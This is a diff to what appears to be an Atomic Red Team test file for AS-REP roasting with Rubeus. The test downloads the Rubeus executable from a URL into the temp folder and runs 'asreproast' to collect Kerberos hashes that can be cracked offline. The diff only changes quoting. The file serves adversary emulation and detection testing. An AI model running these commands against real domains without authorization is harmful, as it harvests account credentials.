@@ -11,15 +11,15 @@ atomic_tests:
     local_folder:
       description: Local path of Rubeus executable
       type: Path
-      default: "$Env:Temp"
+      default: $Env:temp
     local_executable:
       description: name of the rubeus executable
       type: String
-      default: "rubeus.exe"
+      default: 'rubeus.exe'
     out_file:
       description: file where command results are stored
       type: String
-      default: "rubeus_output.txt"
+      default: rubeus_output.txt
     rubeus_url:
       description: URL of Rubeus executable
       type: url
@@ -40,7 +40,7 @@ atomic_tests:
       Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
   executor:
     command: |
-      #{local_folder}\#{local_executable} asreproast /outfile:#{local_folder}\#{out_file}
+      "#{local_folder}\#{local_executable}" + " asreproast " + "/outfile:#{local_folder}\#{out_file}"
     cleanup_command: |
       Remove-Item #{local_folder}\#{local_executable} -ErrorAction Ignore
       Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
